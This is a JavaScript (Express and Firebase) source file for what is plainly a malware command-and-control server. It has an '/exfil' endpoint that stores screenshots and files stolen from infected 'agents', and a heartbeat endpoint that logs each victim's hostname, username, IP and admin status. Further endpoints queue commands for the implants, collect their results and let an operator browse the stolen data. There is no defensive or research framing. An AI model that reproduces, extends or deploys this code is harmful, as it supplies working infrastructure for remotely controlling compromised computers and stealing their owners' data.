const express = require('express');
const admin = require('firebase-admin');
const crypto = require('crypto');
const Busboy = require('busboy');
const fs = require('fs');
const path = require('path');
const os = require('os');

const serviceAccount = require('../firebase/serviceAccount.json');
admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
const db = admin.firestore();

const app = express();
const router = express.Router();

// ============ EXISTING ENDPOINTS ============

router.post('/exfil', async (req, res) => {
    try {
        const contentType = req.headers['content-type'] || '';

        if (contentType.includes('multipart/form-data')) {
            const bb = Busboy({ headers: req.headers });
            const fields = {};
            let fileBuffer = null;
            let filename = '';

            bb.on('file', (fieldname, file, info) => {
                filename = info.filename;
                const chunks = [];
                file.on('data', (data) => chunks.push(data));
                file.on('end', () => { fileBuffer = Buffer.concat(chunks); });
            });

            bb.on('field', (fieldname, val) => { fields[fieldname] = val; });

            bb.on('finish', async () => {
                const sessionId = fields.session_id || fields.sessionId || 'unknown';
                const fileType = fields.type || 'screenshot';

                const docRef = await db.collection('exfil').add({
                    sessionId,
                    type: fileType,
                    filename: filename || `${fileType}_${Date.now()}.png`,
                    data: fileBuffer ? fileBuffer.toString('base64') : null,
                    timestamp: admin.firestore.FieldValue.serverTimestamp(),
                    metadata: fields
                });

                await db.collection('agents').doc(sessionId).set({
                    lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
                    lastExfilType: fileType,
                    lastExfilTime: admin.firestore.FieldValue.serverTimestamp()
                }, { merge: true });

                res.json({ success: true, id: docRef.id });
            });
            bb.end(req.body);
        } else {
            const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
            const sessionId = data.session_id || data.sessionId || 'unknown';

            const docRef = await db.collection('exfil').add({
                ...data,
                timestamp: admin.firestore.FieldValue.serverTimestamp()
            });

            await db.collection('agents').doc(sessionId).set({
                lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
                lastExfilType: 'json',
                lastExfilTime: admin.firestore.FieldValue.serverTimestamp()
            }, { merge: true });

            res.json({ success: true, id: docRef.id });
        }
    } catch (err) {
        console.error('Exfil error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

router.post('/heartbeat', async (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { session_id, hostname, username, os_info, ip, is_admin, process_id, modules } = data;

        const agentData = {
            sessionId: session_id,
            hostname: hostname || 'unknown',
            username: username || 'unknown',
            os: os_info || 'unknown',
            ip: ip || 'unknown',
            isAdmin: is_admin || false,
            processId: process_id || null,
            modules: modules || [],
            lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
            firstSeen: admin.firestore.FieldValue.serverTimestamp(),
            status: 'active'
        };

        const existingDoc = await db.collection('agents').doc(session_id).get();
        if (existingDoc.exists) {
            delete agentData.firstSeen;
        }

        await db.collection('agents').doc(session_id).set(agentData, { merge: true });

        res.json({ success: true, next_poll: 15, server_time: new Date().toISOString() });
    } catch (err) {
        console.error('Heartbeat error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ NEW C2 ENDPOINTS ============

router.get('/get_commands', async (req, res) => {
    try {
        const sessionId = req.query.session_id;
        if (!sessionId) {
            return res.status(400).json({ success: false, error: 'session_id required' });
        }

        const snapshot = await db.collection('commands')
            .where('target_session', 'in', [sessionId, 'all'])
            .where('status', '==', 'pending')
            .where('scheduled_time', '<=', new Date().toISOString())
            .orderBy('scheduled_time', 'asc')
            .limit(10)
            .get();

        const commands = [];
        snapshot.forEach(doc => {
            commands.push({ id: doc.id, ...doc.data() });
        });

        res.json({ success: true, commands, count: commands.length });
    } catch (err) {
        console.error('Get commands error:', err);
        res.json({ success: true, commands: [], count: 0 });
    }
});

router.post('/send_command', async (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { target_session, command_type, parameters, scheduled_time } = data;

        if (!target_session || !command_type) {
            return res.status(400).json({ success: false, error: 'target_session and command_type required' });
        }

        const commandDoc = {
            target_session,
            command_type,
            parameters: parameters || {},
            status: 'pending',
            result: null,
            created_at: admin.firestore.FieldValue.serverTimestamp(),
            scheduled_time: scheduled_time || new Date().toISOString(),
            created_by: data.created_by || 'dashboard'
        };

        const docRef = await db.collection('commands').add(commandDoc);
        res.json({ success: true, command_id: docRef.id });
    } catch (err) {
        console.error('Send command error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

router.post('/command_complete', async (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { command_id, status, result, error, session_id } = data;

        if (!command_id) {
            return res.status(400).json({ success: false, error: 'command_id required' });
        }

        const updateData = {
            status: status || 'completed',
            completed_at: admin.firestore.FieldValue.serverTimestamp(),
            result: result || null,
            error: error || null,
            completed_by: session_id || 'unknown'
        };

        await db.collection('commands').doc(command_id).update(updateData);

        await db.collection('exfil').add({
            sessionId: session_id || 'unknown',
            type: 'command_result',
            command_id,
            command_type: data.command_type || 'unknown',
            status: updateData.status,
            result,
            error,
            timestamp: admin.firestore.FieldValue.serverTimestamp()
        });

        res.json({ success: true });
    } catch (err) {
        console.error('Command complete error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

router.get('/agents', async (req, res) => {
    try {
        const snapshot = await db.collection('agents').orderBy('lastHeartbeat', 'desc').get();
        const agents = [];
        snapshot.forEach(doc => {
            agents.push({ id: doc.id, ...doc.data() });
        });
        res.json({ success: true, agents });
    } catch (err) {
        console.error('List agents error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

router.delete('/agents/:id', async (req, res) => {
    try {
        await db.collection('agents').doc(req.params.id).delete();
        res.json({ success: true });
    } catch (err) {
        console.error('Delete agent error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

router.get('/exfil_data', async (req, res) => {
    try {
        const sessionId = req.query.session_id;
        let query = db.collection('exfil').orderBy('timestamp', 'desc').limit(100);
        if (sessionId) {
            query = db.collection('exfil').where('sessionId', '==', sessionId).orderBy('timestamp', 'desc').limit(100);
        }

        const snapshot = await query.get();
        const items = [];
        snapshot.forEach(doc => {
            items.push({ id: doc.id, ...doc.data() });
        });
        res.json({ success: true, data: items });
    } catch (err) {
        console.error('Exfil data error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

app.use('/api', router);
module.exports = app;